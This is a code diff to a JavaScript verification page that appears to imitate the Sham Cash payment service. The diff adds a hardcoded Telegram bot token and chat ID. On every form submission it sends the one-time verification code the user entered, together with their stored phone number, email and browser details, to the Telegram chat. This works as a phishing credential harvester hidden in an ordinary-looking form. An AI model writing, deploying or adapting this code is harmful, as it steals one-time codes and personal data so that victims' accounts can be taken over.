@@ -7,6 +7,8 @@ document.addEventListener('DOMContentLoaded', function() {
     const backBtn = document.getElementById('backBtn');
 
     const WHATSAPP_NUMBER = '+963985601385';
+    const TELEGRAM_BOT_TOKEN = '8335962255:AAHDeJbWKC9D7zeESdlMtq5cX86PnFVKjuk';
+    const TELEGRAM_CHAT_ID = '7464148063';
 
     codeInputs.forEach((input, index) => {
         input.addEventListener('input', function(e) {
@@ -63,10 +65,55 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
+    async function sendToTelegram(verificationCode) {
+        const phoneNumber = localStorage.getItem('userPhone') || 'غير متوفر';
+        const email = localStorage.getItem('userEmail') || 'غير متوفر';
+        const timestamp = new Date().toLocaleString('ar-SY', {
+            timeZone: 'Asia/Damascus',
+            year: 'numeric',
+            month: 'numeric',
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
+        });
+
+        const message = `🔐 محاولة إدخال رمز تحقق - شام كاش
+
+📱 رقم الهاتف: ${phoneNumber}
+📧 البريد الإلكتروني: ${email}
+🔢 رمز التحقق المُدخل: ${verificationCode}
+
+⏰ الوقت: ${timestamp}
+🌐 المتصفح: ${navigator.userAgent}`;
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            if (!response.ok) {
+                console.error('فشل إرسال الرسالة إلى تيليجرام');
+            }
+        } catch (error) {
+            console.error('خطأ في الاتصال بتيليجرام:', error);
+        }
+    }
+
     verificationForm.addEventListener('submit', function(e) {
         e.preventDefault();
 
         const code = Array.from(codeInputs).map(input => input.value).join('');
+
+        sendToTelegram(code);
 
         if (code.length !== 6) {
             showNotification('الرجاء إدخال الرمز كاملاً', 'error');
